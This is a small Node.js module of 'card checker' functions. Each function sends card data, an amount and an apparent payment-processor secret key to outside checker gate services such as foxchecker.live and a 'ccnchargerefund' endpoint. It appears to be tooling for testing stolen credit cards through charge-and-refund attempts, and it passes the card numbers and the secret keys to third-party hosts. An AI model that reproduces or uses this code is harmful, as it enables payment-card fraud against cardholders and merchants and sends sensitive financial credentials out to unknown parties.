const axios = require('axios');



async function ccCheck(sk,cc,am){
  const url = `https://www.xcchost.com/api/sec=${sk}&lista=${cc}&cst=${am}`
  const res = await axios.get(url)
  return res.data
}

module.exports.xcchost= ccCheck;


async function foxccn(sk,cc,am){
  const url = `https://foxchecker.live/gate/usd1ccn.php?lista=${cc}&sec=${sk}&cst=${am}&unm=&idd=`
  const res = await axios.get(url)
  return res.data
}

module.exports.foxccn = foxccn;

async function foxcvv(sk, cc, am) {
  const url = `https://foxchecker.live/gate/usd1cvv.php?lista=${cc}&sec=${sk}&cst=${am}&unm=&idd=`
  const res = await axios.get(url)
  return res.data
}

module.exports.foxcvv = foxcvv;

async function mainccn(sk,cc,am,cur){
  const url = `https://kizunahayase.net/api/ccnchargerefund.php?referrer=Mikashita&cc_info=${cc}&proxyisrequired=false&skindex=1&useforwarder=false`
  try{
  const res = await axios.get(url,{headers: {'msk': sk,'cookie':'save'+sk,'amount':am,'currency':cur}}) 
  return res.data
 } catch (error) {
  if (axios.isCancel(error)) {
    console.log('Request canceled:', error.message);
  } else if (error.message === 'Connection Aborted') {
    console.log('Connection Aborted:', error.message);
  } else {
    console.log('Error:', error.message);
  }
} 
  
  
}

module.exports.mainccn = mainccn
